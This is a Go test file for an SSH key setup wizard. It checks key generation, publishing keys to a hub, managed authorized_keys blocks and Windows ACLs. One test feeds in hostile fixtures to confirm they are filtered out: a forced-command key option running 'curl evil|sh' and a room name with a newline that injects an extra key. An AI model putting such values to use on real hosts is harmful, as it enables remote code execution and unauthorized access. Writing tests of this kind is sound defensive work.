package sshwizard

import (
	"context"
	"strings"
	"testing"
)

const (
	fxPub  = `C:\Users\claude\.ssh\atrium_ed25519.pub`
	fxPriv = `C:\Users\claude\.ssh\atrium_ed25519`
	fxAuth = `C:\Users\claude\.ssh\authorized_keys`
)

// keygenMakes makes the fake ssh-keygen leave a key, the way the real one does.
func keygenMakes(m *fakeMachine) {
	m.runs["ssh-keygen -q"] = ranAnswer{}
	m.onRun = func(m *fakeMachine, line string) {
		if strings.HasPrefix(line, "ssh-keygen -q") {
			m.fakeEnv.files[fxPriv] = "private"
			m.fakeEnv.files[fxPub] = keyLine("ssh-ed25519", "mine") + " atrium:sg3\n"
		}
	}
}

func hubWith(m *fakeMachine, peers ...PeerKey) {
	m.pubErr, m.peersErr = nil, nil
	m.peers = peers
}

func stepOf(rep Report, n int) Result { return rep.Results[n-1] }

// A ROOM WITH NO KEY, NOTHING PUBLISHED AND NO AUTHORIZED KEYS IS FIXED IN ONE RUN: the key made, published, and the
// hub's set written, with every key labelled by its room.
func TestFixMakesPublishesAndInstalls(t *testing.T) {
	m := winMachine()
	keygenMakes(m)
	hubWith(m, PeerKey{Room: "sg4", Key: keyLine("ssh-ed25519", "sg4") + " their comment", SSHOn: true},
		PeerKey{Room: "m1mini", Key: keyLine("ssh-ed25519", "m1mini")})
	m.sw.From = []string{"*"}
	// What the hub holds after the publish is what the next check reads back.
	m.published = nil
	rep, acts := Fix(context.Background(), m, Options{SelfTest: true})
	if len(acts) != 3 || !acts[0].Done || !acts[1].Done || !acts[2].Done || acts[0].N != 5 || acts[1].N != 6 || acts[2].N != 7 {
		t.Fatalf("actions: %+v", acts)
	}
	if len(m.sent) != 1 || m.sent[0].User != "claude" || m.sent[0].Port != 22 || m.sent[0].Key != keyLine("ssh-ed25519", "mine") {
		t.Fatalf("published: %+v", m.sent)
	}
	if !strings.Contains(strings.Join(m.mkdirs, "|"), `C:\Users\claude\.ssh`) {
		t.Fatalf("the .ssh directory was not made: %v", m.mkdirs)
	}
	got := m.fakeEnv.files[fxAuth]
	for _, w := range []string{keyLine("ssh-ed25519", "mine") + " atrium:sg3\n", keyLine("ssh-ed25519", "sg4") + " atrium:sg4\n", beginMark, endMark} {
		if !strings.Contains(got, w) {
			t.Fatalf("authorized_keys lacks %q:\n%s", w, got)
		}
	}
	// m1mini is allowed by the from list "*" and is in. The comment another room put on its key is dropped.
	if strings.Contains(got, "their comment") || !strings.Contains(got, "atrium:m1mini") {
		t.Fatalf("authorized_keys:\n%s", got)
	}
	if m.modes[fxAuth] != 0o600 {
		t.Fatalf("mode %v", m.modes[fxAuth])
	}
	// Step 6 reads the hub, which here still says nothing, so it stays todo. Steps 5 and 7 are done.
	if stepOf(rep, 5).Status != OK || stepOf(rep, 7).Status != OK {
		t.Fatalf("after: %+v", rep.Results)
	}
}

// A PERSON'S OWN KEYS ARE NEVER TOUCHED, a removed room's key leaves, and a second run changes nothing.
func TestFixRewritesOnlyAtriumsBlock(t *testing.T) {
	m := winMachine().withKey()
	hubWith(m, PeerKey{Room: "sg4", Key: keyLine("ssh-ed25519", "sg4"), SSHOn: true})
	m.sw.From = []string{"*"}
	mine := "ssh-rsa AAAAB3 clint@laptop\n"
	after := "command=\"echo hi\" ssh-ed25519 " + blob("theirs") + " ci\n"
	m.fakeEnv.files[fxAuth] = mine + beginMark + "\n" + keyLine("ssh-ed25519", "gone") + " atrium:gone\n" + endMark + "\n" + after
	_, acts := Fix(context.Background(), m, Options{SelfTest: true})
	var inst Action
	for _, a := range acts {
		if a.N == 7 {
			inst = a
		}
	}
	if !inst.Done {
		t.Fatalf("%+v", acts)
	}
	got := m.fakeEnv.files[fxAuth]
	if strings.Contains(got, "atrium:gone") || !strings.Contains(got, "atrium:sg4") {
		t.Fatalf("the block is wrong:\n%s", got)
	}
	if !strings.HasPrefix(got, mine) || !strings.Contains(got, after) {
		t.Fatalf("a line outside the block changed:\n%s", got)
	}
	first := got
	_, acts = Fix(context.Background(), m, Options{SelfTest: true})
	for _, a := range acts {
		if a.N == 7 {
			t.Fatalf("a second run rewrote the file: %+v", a)
		}
	}
	if m.fakeEnv.files[fxAuth] != first {
		t.Fatal("a second run changed the file")
	}
}

// A BLOCK WITH NO END, or a hub that cannot say, leaves the file as it was.
func TestFixRefusesWhatItCannotDoSafely(t *testing.T) {
	m := winMachine().withKey()
	hubWith(m, PeerKey{Room: "sg4", Key: keyLine("ssh-ed25519", "sg4")})
	m.sw.From = []string{"*"}
	broken := "ssh-rsa AAAAB3 me\n" + beginMark + "\n" + keyLine("ssh-ed25519", "x") + "\n"
	m.fakeEnv.files[fxAuth] = broken
	_, acts := Fix(context.Background(), m, Options{SelfTest: true})
	last := acts[len(acts)-1]
	if last.N != 7 || last.Done || !strings.Contains(last.Err, "no `# END atrium`") {
		t.Fatalf("%+v", acts)
	}
	if m.fakeEnv.files[fxAuth] != broken {
		t.Fatal("the file changed")
	}

	m2 := winMachine().withKey()
	m2.fakeEnv.files[fxAuth] = "ssh-rsa AAAAB3 me\n"
	_, acts = Fix(context.Background(), m2, Options{SelfTest: true})
	for _, a := range acts {
		if a.N == 7 && a.Done {
			t.Fatalf("installed with the hub's set unknown: %+v", a)
		}
	}
	if m2.fakeEnv.files[fxAuth] != "ssh-rsa AAAAB3 me\n" {
		t.Fatal("the file changed with the hub's set unknown")
	}
}

// AN ADMINISTRATOR'S FILE IS WRITTEN ONLY BY AN ELEVATED ROOM, and gets the icacls that makes sshd read it.
func TestFixWindowsAdministratorsFile(t *testing.T) {
	const admin = `C:\ProgramData\ssh\administrators_authorized_keys`
	setup := func(elevated bool) *fakeMachine {
		m := winMachine().withKey()
		m.runs["Get-LocalGroupMember"] = ranAnswer{out: "SG3\\claude\n"}
		m.runs["icacls"] = ranAnswer{}
		m.account.Elevated = elevated
		hubWith(m, PeerKey{Room: "sg4", Key: keyLine("ssh-ed25519", "sg4")})
		m.sw.From = []string{"*"}
		return m
	}
	m := setup(false)
	_, acts := Fix(context.Background(), m, Options{SelfTest: true})
	if _, ok := m.fakeEnv.files[admin]; ok {
		t.Fatalf("a room that is not elevated wrote the administrators file: %+v", acts)
	}
	for _, l := range m.ran {
		if strings.Contains(l, "icacls") {
			t.Fatalf("ran %q", l)
		}
	}
	m = setup(true)
	Fix(context.Background(), m, Options{SelfTest: true})
	if !strings.Contains(m.fakeEnv.files[admin], "atrium:sg4") {
		t.Fatalf("not written:\n%s", m.fakeEnv.files[admin])
	}
	ran := strings.Join(m.ran, "\n")
	if !strings.Contains(ran, "icacls "+admin+" /inheritance:r /grant Administrators:F /grant SYSTEM:F") {
		t.Fatalf("no icacls:\n%s", ran)
	}
}

// --user IS THE ROOM'S OWN SAY: saved, and published with the key.
func TestFixSavesTheLoginUserAndPublishesIt(t *testing.T) {
	m := winMachine().withKey()
	m.users["localai"] = true
	hubWith(m)
	_, acts := Fix(context.Background(), m, Options{User: "localai", SelfTest: true})
	if m.savedUser != "localai" || acts[0].N != 4 || !acts[0].Done {
		t.Fatalf("%q %+v", m.savedUser, acts)
	}
	if len(m.sent) != 1 || m.sent[0].User != "localai" {
		t.Fatalf("published %+v", m.sent)
	}
	// Not asked again when it is already the saved one.
	m2 := winMachine().withKey()
	m2.sw.User = "claude"
	hubWith(m2)
	if _, acts = Fix(context.Background(), m2, Options{User: "claude"}); m2.savedUser != "" {
		t.Fatalf("saved again: %+v", acts)
	}
}

// A PRIVATE KEY WITH NO .pub IS NOT REGENERATED: the public half is read out of it.
func TestFixReadsThePublicHalfFromAnExistingPrivateKey(t *testing.T) {
	m := winMachine()
	m.fakeEnv.files[fxPriv] = "private"
	m.runs["ssh-keygen -y"] = ranAnswer{out: keyLine("ssh-ed25519", "mine") + " old\n"}
	hubWith(m)
	_, acts := Fix(context.Background(), m, Options{})
	if !acts[0].Done || !strings.Contains(m.fakeEnv.files[fxPub], keyLine("ssh-ed25519", "mine")) {
		t.Fatalf("%+v %q", acts, m.fakeEnv.files[fxPub])
	}
	for _, l := range m.ran {
		if strings.Contains(l, "ssh-keygen -q") {
			t.Fatalf("regenerated: %q", l)
		}
	}
}

// A STEP THAT NEEDS A PERSON IS NEVER FIXED: no ssh-keygen means nothing is written.
func TestFixLeavesNeedsHumanAlone(t *testing.T) {
	m := winMachine()
	m.have = nil
	_, acts := Fix(context.Background(), m, Options{})
	if len(acts) != 0 || len(m.fakeEnv.files) != 1 && len(m.sent) != 0 {
		t.Fatalf("%+v %v", acts, m.sent)
	}
}

func TestReplaceBlock(t *testing.T) {
	got, err := ReplaceBlock("a\nb", []wantKey{{"ssh-ed25519 AAA", "r1"}})
	if err != nil || !strings.HasPrefix(got, "a\nb\n"+beginMark) || !strings.HasSuffix(got, "ssh-ed25519 AAA atrium:r1\n"+endMark+"\n") {
		t.Fatalf("%q %v", got, err)
	}
	if back, _ := ReplaceBlock(got, nil); back != "a\nb\n" {
		t.Fatalf("removing the block: %q", back)
	}
}

// THE HUB'S SET IS NOT TRUSTED: an options-prefixed key, an rsa key, a bad body and a bad room name never reach the
// block, and a good key beside them does.
func TestFixDropsWhatTheHubRelayedThatIsNotAKey(t *testing.T) {
	m := winMachine().withKey()
	m.sw.From = []string{"*"}
	hubWith(m,
		PeerKey{Room: "good", Key: keyLine("ssh-ed25519", "good")},
		PeerKey{Room: "opts", Key: `command="curl evil|sh" ` + keyLine("ssh-ed25519", "opts")},
		PeerKey{Room: "rsa", Key: keyLine("ssh-rsa", "rsa")},
		PeerKey{Room: "badbody", Key: "ssh-ed25519 !!!notbase64"},
		PeerKey{Room: "bad room\nssh-ed25519 " + blob("inj"), Key: keyLine("ssh-ed25519", "badroom")},
		PeerKey{Room: "multi", Key: keyLine("ssh-ed25519", "multi") + "\nssh-ed25519 " + blob("second")},
	)
	Fix(context.Background(), m, Options{SelfTest: true})
	got := m.fakeEnv.files[fxAuth]
	if !strings.Contains(got, "atrium:good") {
		t.Fatalf("the good key is missing:\n%s", got)
	}
	for _, bad := range []string{"command=", "ssh-rsa", "notbase64", "bad room", blob("badroom"), blob("inj"), blob("second"), "atrium:opts", "atrium:rsa"} {
		if strings.Contains(got, bad) {
			t.Fatalf("%q reached authorized_keys:\n%s", bad, got)
		}
	}
}

func TestSyncOfASettledRoomIsOnePass(t *testing.T) {
	m := winMachine()
	keygenMakes(m)
	hubWith(m, PeerKey{Room: "sg4", Key: keyLine("ssh-ed25519", "sg4"), SSHOn: true})
	m.sw.From = []string{"*"}
	m.published = nil
	Fix(context.Background(), m, Options{})
	m.published = &Published{User: "claude", Port: 22, Fingerprint: fp("mine"), Enabled: true}
	m.ranMu.Lock()
	m.ran = nil
	m.ranMu.Unlock()

	_, acts := Sync(context.Background(), m, Options{}, 6, 7)
	if len(acts) != 0 {
		t.Fatalf("a settled room was changed: %+v", acts)
	}
	m.ranMu.Lock()
	defer m.ranMu.Unlock()
	n := 0
	for _, l := range m.ran {
		if strings.Contains(l, "Get-LocalGroupMember") {
			n++
		}
	}
	if n != 1 {
		t.Fatalf("a settled room was checked %d times, want once: %v", n, m.ran)
	}
}

// THE TIMER NEVER SSHES AND NEVER SCANS. The self test, the reach of other rooms and the address scan answer only the
// wizard's reader, and the room's own key still goes in its block.
func TestSyncRunsNoSSHAndNoScan(t *testing.T) {
	m := winMachine().withKey()
	m.have["ssh"] = true
	m.sw.On, m.sw.From = true, []string{"*"}
	hubWith(m, PeerKey{Room: "sg4", Key: keyLine("ssh-ed25519", "sg4"), SSHOn: true, Online: true})
	m.published = nil
	rep, acts := Sync(context.Background(), m, Options{SelfTest: true}, 6, 7)
	if len(acts) != 2 {
		t.Fatalf("actions: %+v", acts)
	}
	m.ranMu.Lock()
	defer m.ranMu.Unlock()
	for _, l := range m.ran {
		if strings.HasPrefix(l, "ssh ") || strings.Contains(l, getService) {
			t.Fatalf("the sync ran %q", l)
		}
	}
	if len(m.scanCalls) != 0 {
		t.Fatalf("the sync scanned %v", m.scanCalls)
	}
	for _, n := range []int{2, 3, 8, 9, 10, 11} {
		if stepOf(rep, n).Status != Skipped {
			t.Fatalf("step %d was checked: %+v", n, stepOf(rep, n))
		}
	}
	if got := m.fakeEnv.files[fxAuth]; !strings.Contains(got, "atrium:sg3") || !strings.Contains(got, "atrium:sg4") {
		t.Fatalf("authorized_keys:\n%s", got)
	}
}
